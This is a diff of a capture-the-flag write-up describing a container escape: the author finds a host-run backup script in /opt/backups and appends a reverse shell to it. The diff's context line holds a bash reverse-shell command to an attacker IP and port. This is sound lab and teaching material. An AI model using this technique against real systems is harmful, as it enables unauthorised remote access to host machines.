@@ -735,22 +735,27 @@ echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.8.47.102/9999 0>&1" 
 ---
 
 >[!note]
-> ### After we know that we are in container from **`.dockerenv`**
+> ### After we confirmed we were inside a container (presence of `.dockerenv`)
 > <img width="729" height="150" alt="image" src="https://github.com/user-attachments/assets/c021c362-eda4-45cd-afb7-1ec7fe70b0f6" />
 >
-> ### and we found **`/opt/backups`** that have
+> ### we discovered `/opt/backups` containing
 > - backup.sh
 > - backup.tar
-> ## in **`backup.sh`** we found this script
+> ## `backup.sh` contains:
 > ```bash
 > #!/bin/bash
 > tar cf /root/container/backup/backup.tar /root/container
 > ```
-> here this script take backup from **`/root/container`** to **`backup.tar`** if you notice in our **`/root`** there is no **`container`** 
+> This script archives `/root/container` into `backup.tar`. Notably, inside the container there is no `/root/container` directory, which indicates that `/root/container` is a path on the **host** (a mounted volume or host directory), not the container's own filesystem.\
 > <img width="800" height="182" alt="image" src="https://github.com/user-attachments/assets/0bd96c4c-6aaa-48d2-a0b3-a4da7c56b67c" />
 >
-> so this is **`/root/container`** form the host not container so i add reveseshell and it bring us to host server
+> I added a reverse-shell line to `backup.sh`. When the host executed that backup script (e.g., via cron or a backup service), the reverse shell connected from the **host**, giving us an interactive shell on the host machine.
 > <img width="957" height="616" alt="image" src="https://github.com/user-attachments/assets/24e6b56f-2690-4c77-8be1-814dec480d78" />
+
+
+
+
+
 
 
 
